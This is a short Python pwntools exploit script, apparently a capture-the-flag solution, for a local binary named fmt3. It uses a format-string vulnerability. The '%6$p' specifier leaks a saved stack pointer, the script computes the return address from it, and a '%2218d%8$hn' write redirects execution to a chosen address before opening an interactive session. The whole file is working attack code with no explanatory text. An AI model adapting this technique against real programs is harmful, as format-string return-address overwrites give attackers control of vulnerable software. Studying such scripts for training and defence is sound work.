from pwn import *
context.log_level = "debug"
context.arch = "amd64"

sh = process("./pwn/string/fmt-3/fmt3")

#  gdb.attach(sh)

sh.recv()
sh.writeline("1"*8)
sh.recv()
sh.writeline("%6$p")
sh.recv()
sh.writeline("1")
sh.recvuntil("0x")
old_rbp = int(sh.recvline().strip(), 16)
ret_addr = old_rbp - 0x38
success("ret_addr:"+hex(ret_addr))


sh.recv()
sh.writeline("2")
sh.recv()
sh.sendline(p64(ret_addr))
sh.recv()
# sh.writeline("%2214d%8$hn")
# 0x4008aa-0x4008a6
sh.writeline("%2218d%8$hn")

sh.recv()
sh.writeline("1")
sh.recv()
sh.interactive()
